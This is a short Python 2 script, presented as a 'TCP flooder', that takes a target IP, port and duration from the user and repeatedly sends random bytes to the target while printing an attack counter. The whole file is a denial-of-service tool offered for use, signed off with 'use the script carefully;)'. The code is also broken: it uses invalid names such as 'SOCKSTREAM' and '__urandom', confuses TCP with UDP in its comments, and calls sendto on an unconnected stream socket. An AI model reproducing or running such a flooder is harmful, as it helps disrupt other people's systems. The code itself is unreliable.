
// python code to attack the target host with tcp socket connections 

# TCP_FLOODER @!!

import sys
import socket 
import time 

import random  

# initialising the socket connection of attackers machine
attacker = socket.socket(socket.AF_INET , socket.SOCKSTREAM) # selecting connectionless udp type connectionless

bytes = random.__urandom(9999) # data storing in bytes 
victim = raw_input("Enter the target ip")

port = input("Enter port number")

duration = input("Time in seconds")

timeout = time.time() + duration

packsent =  0     # initialised the variable representing the udp packets sent to the target ip 


while 1:

		if time.time() > timeout: # if time limit exceeds the input time given by the user then loop must be breaked 
				break
				
		else:
				pass
		
		attacker.sendto(bytes,(victim,port))
		
		packsent = packsent + 1
		
		print "Attacking %s sent packets %s to the port %s "%(packsent,victim,port)
    
# program ends 
# use the script carefully;)
